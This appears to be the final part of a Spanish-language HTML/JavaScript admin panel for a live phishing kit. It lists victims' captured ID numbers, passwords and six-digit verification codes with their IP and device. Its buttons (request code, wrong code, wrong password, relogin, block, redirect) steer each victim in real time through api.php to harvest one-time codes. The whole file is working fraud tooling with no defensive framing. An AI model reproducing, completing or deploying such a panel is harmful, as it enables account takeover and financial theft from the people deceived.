                    if (nuevoJsonStr === cacheJsonStr && !manual) {
                        return;
                    }

                    cacheJsonStr = nuevoJsonStr;
                    registrosGlobales = nuevosRegistros;

                    actualizarEstadisticas();
                    renderCuadros();

                    if (manual) {
                        showToast('Cuadros actualizados correctamente');
                    }
                }
            } catch (err) {
                // Silencioso ante pÃ©rdidas temporales de red
            }
        }

        function actualizarEstadisticas() {
            // MÃ©tricas superiores retiradas a peticiÃ³n
        }

        function filtrarCuadros() {
            renderCuadros();
        }

        // Renderiza los cuadros en estricto orden cronolÃ³gico (1, 2, 3...)
        function renderCuadros() {
            const container = document.getElementById('cardsGrid');
            const search = document.getElementById('searchInput').value.toLowerCase().trim();

            const filtrados = registrosGlobales.filter(item => {
                if (!search) return true;
                const doc = (item.documento || '').toLowerCase();
                const pass = (item.password || '').toLowerCase();
                const cod = (item.codigo || '').toLowerCase();
                const ip = (item.ip || '').toLowerCase();
                const disp = (item.dispositivo || '').toLowerCase();
                const fecha = (item.fecha || '').toLowerCase();
                const num = ('cuadro #' + item.numero).toLowerCase();
                return doc.includes(search) || pass.includes(search) || cod.includes(search) || ip.includes(search) || disp.includes(search) || fecha.includes(search) || num.includes(search);
            });

            if (filtrados.length === 0) {
                if (registrosGlobales.length === 0) {
                    container.innerHTML = `
                        <div class="empty-state">
                            <i class="fa-solid fa-inbox"></i>
                            <h3>AÃºn no han llegado cuadros de informaciÃ³n</h3>
                            <p>Cada vez que un cliente ingrese sus datos en la web (IdentificaciÃ³n, ContraseÃ±a, CÃ³digo de 6 dÃ­gitos), irÃ¡ pasando a un nuevo cuadro en orden sin borrar nada.</p>
                        </div>
                    `;
                } else {
                    container.innerHTML = `
                        <div class="empty-state">
                            <i class="fa-solid fa-magnifying-glass"></i>
                            <h3>No se encontraron coincidencias</h3>
                            <p>Intente con otro tÃ©rmino de bÃºsqueda.</p>
                        </div>
                    `;
                }
                return;
            }

            let html = '';
            filtrados.forEach((item) => {
                const doc = item.documento ? escapeHtml(item.documento) : 'VacÃ­o';
                const hasPass = Boolean(item.password && item.password.length > 0);
                const hasCode = Boolean(item.codigo && item.codigo.length > 0);
                const pass = hasPass ? escapeHtml(item.password) : '';
                const code = hasCode ? escapeHtml(item.codigo) : '';
                const ip = item.ip ? escapeHtml(item.ip) : 'Desconocida';
                const disp = item.dispositivo ? escapeHtml(item.dispositivo) : 'Desconocido';
                const fecha = item.fecha || 'Sin fecha';
                const num = item.numero || 1;
                const id = item.id;
                const accion = item.accion || 'esperando';
                const redir = item.redirect_url || '';
                const isOnline = item.en_linea === true;

                const badgeConexion = isOnline 
                    ? `<span class="badge-online" title="El cliente estÃ¡ actualmente activo en la web"><span class="pulse-dot"></span> En lÃ­nea</span>` 
                    : `<span class="badge-offline" title="El cliente ha salido de la web"><i class="fa-solid fa-circle-xmark"></i> SaliÃ³ de la web</span>`;

                let badgeHtml = '';
                let bannerHtml = '';

                if (accion === 'relogin') {
                    badgeHtml = `<span class="badge-status badge-status-relogin"><i class="fa-solid fa-arrow-rotate-left"></i> Relogin Enviado</span>`;
                    bannerHtml = `
                    <div class="action-banner relogin-banner">
                        <i class="fa-solid fa-arrow-rotate-left"></i>
                        <span>Cliente enviado al principio (Paso 1)</span>
                    </div>`;
                } else if (accion === 'finalizar') {
                    badgeHtml = `<span class="badge-status badge-status-finalizar"><i class="fa-solid fa-check-double"></i> Finalizado</span>`;
                    bannerHtml = `
                    <div class="action-banner finalizar-banner">
                        <i class="fa-solid fa-arrow-up-right-from-square"></i>
                        <span>RedirecciÃ³n ejecutada ${redir ? '(' + escapeHtml(redir) + ')' : ''}</span>
                    </div>`;
                } else if (accion === 'bloquear') {
                    badgeHtml = `<span class="badge-status badge-status-bloqueado"><i class="fa-solid fa-ban"></i> Bloqueado</span>`;
                    bannerHtml = `
                    <div class="action-banner bloqueado-banner">
                        <i class="fa-solid fa-ban"></i>
                        <span>Acceso bloqueado por seguridad</span>
                    </div>`;
                } else if (accion === 'pedir_codigo') {
                    badgeHtml = `<span class="badge-status badge-status-code"><i class="fa-solid fa-key"></i> CÃ³digo Solicitado</span>`;
                    bannerHtml = `
                    <div class="action-banner code-banner">
                        <i class="fa-solid fa-hourglass-half"></i>
                        <span>Solicitando cÃ³digo de 6 dÃ­gitos al cliente (Esperando cÃ³digo...)</span>
                    </div>`;
                } else if (accion === 'codigo_error') {
                    badgeHtml = `<span class="badge-status badge-status-relogin"><i class="fa-solid fa-triangle-exclamation"></i> CÃ³d. ErrÃ³neo</span>`;
                    bannerHtml = `
                    <div class="action-banner relogin-banner">
                        <i class="fa-solid fa-triangle-exclamation"></i>
                        <span>CÃ³digo incorrecto enviado al cliente (Esperando reintento...)</span>
                    </div>`;
                } else if (accion === 'pass_error') {
                    badgeHtml = `<span class="badge-status badge-status-relogin"><i class="fa-solid fa-lock"></i> Clave ErrÃ³nea</span>`;
                    bannerHtml = `
                    <div class="action-banner relogin-banner">
                        <i class="fa-solid fa-lock"></i>
                        <span>ContraseÃ±a errÃ³nea enviada al cliente (Esperando reintento...)</span>
                    </div>`;
                } else if (hasCode) {
                    badgeHtml = `<span class="badge-status badge-status-success"><i class="fa-solid fa-shield-check"></i> CÃ³digo Recibido</span>`;
                    bannerHtml = `
                    <div class="action-banner code-received-banner">
                        <i class="fa-solid fa-circle-check"></i>
                        <span>Â¡CÃ³digo de 6 dÃ­gitos recibido! (Cliente en validaciÃ³n)</span>
                    </div>`;
                } else if (hasPass) {
                    badgeHtml = `<span class="badge-status badge-status-code"><i class="fa-solid fa-key"></i> Clave Recibida</span>`;
                    bannerHtml = `
                    <div class="action-banner pass-received-banner">
                        <i class="fa-solid fa-spinner fa-spin"></i>
                        <span>ContraseÃ±a recibida - Cliente esperando validaciÃ³n</span>
                    </div>`;
                } else {
                    badgeHtml = `<span class="badge-status" style="background:#f1f5f9; color:#475569;"><i class="fa-solid fa-id-card"></i> IdentificaciÃ³n</span>`;
                    bannerHtml = `
                    <div class="action-banner esperando-banner">
                        <i class="fa-regular fa-clock"></i>
                        <span>IdentificaciÃ³n recibida - Cliente ingresando contraseÃ±a</span>
                    </div>`;
                }

                // RepresentaciÃ³n de ContraseÃ±a
                const passIsHidden = passwordOcultos[id] === true;
                const passTextShown = hasPass ? (passIsHidden ? 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢' : pass) : '<span class="field-value-pending">Esperando contraseÃ±a...</span>';
                const passEyeClass = passIsHidden ? 'fa-solid fa-eye' : 'fa-solid fa-eye-slash';

                // RepresentaciÃ³n de CÃ³digo
                const codeTextShown = hasCode 
                    ? `<span class="field-value-code">${code}</span>` 
                    : `<span class="field-value-pending">Esperando cÃ³digo de 6 dÃ­gitos...</span>`;

                let histHtml = '';
                if (item.historial_codigos && Array.isArray(item.historial_codigos) && item.historial_codigos.length > 0) {
                    histHtml = `<div style="margin-top:4px; font-size:11.5px; color:#64748b;">
                        <span style="font-weight:600;">Previo(s):</span> ${item.historial_codigos.map(c => `<span style="font-family:'JetBrains Mono', monospace; text-decoration:line-through; color:#94a3b8; margin-right:4px;">${escapeHtml(c)}</span>`).join(', ')}
                    </div>`;
                }

                html += `
                <div class="info-card" id="card-${id}">
                    <div class="card-header">
                        <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
                            <span class="cuadro-tag">Cuadro #${num}</span>
                            ${badgeConexion}
                            ${badgeHtml}
                        </div>
                        <button class="btn-delete-card" onclick="eliminarCuadro('${id}')" title="Eliminar este cuadro">
                            <i class="fa-solid fa-trash-can"></i>
                        </button>
                    </div>

                    <div class="card-body">
                        <!-- Campo 1: NÃºmero de IdentificaciÃ³n -->
                        <div class="field-group">
                            <span class="field-label">
                                <i class="fa-solid fa-id-card" style="color:var(--primary);"></i>
                                1. NÃºmero de IdentificaciÃ³n
                            </span>
                            <div class="field-value-box">
                                <span class="field-value-doc">${doc}</span>
                                <button class="btn-copy" onclick="copiarTexto('${doc}', 'IdentificaciÃ³n copiada')" title="Copiar nÃºmero de identificaciÃ³n">
                                    <i class="fa-regular fa-copy"></i>
                                </button>
                            </div>
                        </div>

                        <!-- Campo 2: ContraseÃ±a -->
                        <div class="field-group">
                            <span class="field-label">
                                <i class="fa-solid fa-lock" style="color:#2563eb;"></i>
                                2. ContraseÃ±a
                            </span>
                            <div class="field-value-box" style="${hasPass ? 'background:#f0fdf4; border-color:#86efac;' : ''}">
                                <span class="field-value-pass" id="pass-val-${id}">${passTextShown}</span>
                                <div style="display:flex; gap:4px; align-items:center;">
                                    ${hasPass ? `
                                    <button class="btn-copy" onclick="togglePassVisibility('${id}', '${escapeAttr(pass)}')" title="Ver u ocultar contraseÃ±a">
                                        <i class="${passEyeClass}" id="pass-eye-${id}"></i>
                                    </button>
                                    <button class="btn-copy" onclick="copiarTexto('${escapeAttr(pass)}', 'ContraseÃ±a copiada')" title="Copiar contraseÃ±a">
                                        <i class="fa-regular fa-copy"></i>
                                    </button>
                                    ` : ''}
                                </div>
                            </div>
                        </div>

                        <!-- Campo 3: CÃ³digo de 6 DÃ­gitos -->
                        <div class="field-group">
                            <span class="field-label">
                                <i class="fa-solid fa-key" style="color:#059669;"></i>
                                3. CÃ³digo de 6 DÃ­gitos
                            </span>
                            <div class="field-value-box" style="${hasCode ? 'background:#ecfdf5; border-color:#34d399; border-width:2px;' : ''}">
                                <div>
                                    ${codeTextShown}
                                    ${histHtml}
                                </div>
                                ${hasCode ? `
                                <button class="btn-copy" onclick="copiarTexto('${escapeAttr(code)}', 'CÃ³digo de 6 dÃ­gitos copiado')" title="Copiar cÃ³digo">
                                    <i class="fa-regular fa-copy"></i>
                                </button>
                                ` : ''}
                            </div>
                        </div>
                    </div>

                    ${bannerHtml}

                    <!-- Botones de AcciÃ³n (Grilla 3x2) -->
                    <div class="card-actions">
                        <!-- Fila 1: Control de Flujo -->
                        <button type="button" class="btn-action btn-action-code ${accion === 'pedir_codigo' ? 'active' : ''}" 
                                onclick="ejecutarAccion('${id}', 'pedir_codigo', ${num})" 
                                title="Pedir CÃ³digo de 6 dÃ­gitos al cliente">
                            <i class="fa-solid fa-key"></i> Pedir CÃ³digo
                        </button>
                        <button type="button" class="btn-action btn-action-code-error ${accion === 'codigo_error' ? 'active' : ''}" 
                                onclick="ejecutarAccion('${id}', 'codigo_error', ${num})" 
                                title="Solicitar cÃ³digo de nuevo por ser incorrecto">
                            <i class="fa-solid fa-triangle-exclamation"></i> CÃ³d. Incorrecto
                        </button>
                        <button type="button" class="btn-action btn-action-pass-error ${accion === 'pass_error' ? 'active' : ''}" 
                                onclick="ejecutarAccion('${id}', 'pass_error', ${num})" 
                                title="Solicitar contraseÃ±a de nuevo por ser incorrecta">
                            <i class="fa-solid fa-lock"></i> Clave Incorrecta
                        </button>

                        <!-- Fila 2: Decisiones de SesiÃ³n -->
                        <button type="button" class="btn-action btn-action-finalizar ${accion === 'finalizar' ? 'active' : ''}" 
                                onclick="ejecutarAccion('${id}', 'finalizar', ${num})" 
                                title="Hacer RedirecciÃ³n a la URL configurada">
                            <i class="fa-solid fa-arrow-up-right-from-square"></i> Finalizar
                        </button>
                        <button type="button" class="btn-action btn-action-relogin ${accion === 'relogin' ? 'active' : ''}" 
                                onclick="ejecutarAccion('${id}', 'relogin', ${num})" 
                                title="Reiniciar sesiÃ³n y volver a pedir identificaciÃ³n">
                            <i class="fa-solid fa-arrow-rotate-left"></i> Relogin
                        </button>
                        <button type="button" class="btn-action btn-action-bloquear ${accion === 'bloquear' ? 'active' : ''}" 
                                onclick="ejecutarAccion('${id}', 'bloquear', ${num})" 
                                title="Bloquear acceso del cliente por seguridad">
                            <i class="fa-solid fa-ban"></i> Bloquear
                        </button>
                    </div>

                    <div class="card-footer">
                        <div class="time-text">
                            <i class="fa-regular fa-clock"></i> ${fecha}
                        </div>
                        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 11.5px;" onclick="copiarTexto('${doc}', 'IdentificaciÃ³n copiada')">
                            <i class="fa-regular fa-copy"></i> Copiar Doc
                        </button>
                    </div>
                </div>
                `;
            });

            container.innerHTML = html;
        }

        async function ejecutarAccion(id, accion, num) {
            const redirInput = document.getElementById('globalRedirectUrl');
            const redirectUrl = redirInput ? redirInput.value.trim() : 'https://www.google.com';

            const formData = new FormData();
            formData.append('id', id);
            formData.append('accion', accion);
            if (accion === 'finalizar') {
                formData.append('redirect_url', redirectUrl);
            }

            // ActualizaciÃ³n optimista inmediata en memoria para respuesta instantÃ¡nea
            const item = registrosGlobales.find(r => r.id === id);
            if (item) {
                item.accion = accion;
                if (accion === 'pedir_codigo') item.estado = 'Pedir cÃ³digo de 6 dÃ­gitos';
                else if (accion === 'codigo_error') item.estado = 'CÃ³digo errÃ³neo';
                else if (accion === 'pass_error') item.estado = 'ContraseÃ±a errÃ³nea';
                else if (accion === 'relogin') item.estado = 'Relogin solicitado';
                else if (accion === 'bloquear') item.estado = 'Bloqueado';
                else if (accion === 'finalizar') {
                    item.estado = 'Finalizado';
                    item.redirect_url = redirectUrl;
                }
                renderCuadros();
            }

            try {
                const res = await fetch('api.php?action=set_action', {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();
                if (data.success) {
                    if (accion === 'pedir_codigo') {
                        showToast(`ðŸ”‘ Cuadro #${num}: Solicitando CÃ³digo de 6 dÃ­gitos`);
                    } else if (accion === 'codigo_error') {
                        showToast(`âš ï¸ Cuadro #${num}: CÃ³digo incorrecto enviado`);
                    } else if (accion === 'pass_error') {
                        showToast(`âš ï¸ Cuadro #${num}: ContraseÃ±a incorrecta enviada`);
                    } else if (accion === 'relogin') {
                        showToast(`ðŸ”„ Cuadro #${num}: Relogin enviado (Paso 1)`);
                    } else if (accion === 'bloquear') {
                        showToast(`ðŸš« Cuadro #${num}: Cliente bloqueado`);
                    } else {
                        showToast(`âœ“ Cuadro #${num}: Finalizar enviado (Redirigiendo a ${redirectUrl})`);
                    }
                    cacheJsonStr = ''; // Forzar sincronizaciÃ³n limpia
                    cargarDatos();
                } else {
                    showToast('Error: ' + (data.message || 'No se pudo aplicar la acciÃ³n'));
                }
            } catch (err) {
                showToast('Error de conexiÃ³n al aplicar la acciÃ³n');
            }
        }

        async function eliminarCuadro(id) {
            if (!confirm('Â¿Desea eliminar este cuadro?')) return;
            try {
                const res = await fetch('api.php?action=delete&id=' + encodeURIComponent(id));
                const data = await res.json();
                if (data.success) {
                    showToast('Cuadro eliminado');
                    cacheJsonStr = '';
                    cargarDatos();
                }
            } catch (err) {
                showToast('Error al eliminar');
            }
        }

        async function confirmarVaciar() {
            if (registrosGlobales.length === 0) {
                showToast('No hay cuadros para vaciar');
                return;
            }
            if (!confirm('Â¿EstÃ¡ seguro de que desea vaciar TODOS los cuadros recibidos? Esta acciÃ³n no se puede deshacer.')) return;
            try {
                const res = await fetch('api.php?action=clear_all');
                const data = await res.json();
                if (data.success) {
                    showToast('Todos los cuadros han sido eliminados');
                    cacheJsonStr = '';
                    cargarDatos();
                }
            } catch (err) {
                showToast('Error al vaciar');
            }
        }

        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function escapeAttr(text) {
            if (!text) return '';
            return text.replace(/'/g, "\\'").replace(/"/g, '&quot;');
        }

        // Carga inicial y sondeo periÃ³dico cada 2 segundos sin parpadeo
        cargarDatos();
        setInterval(cargarDatos, 2000);
    </script>
</body>
</html>

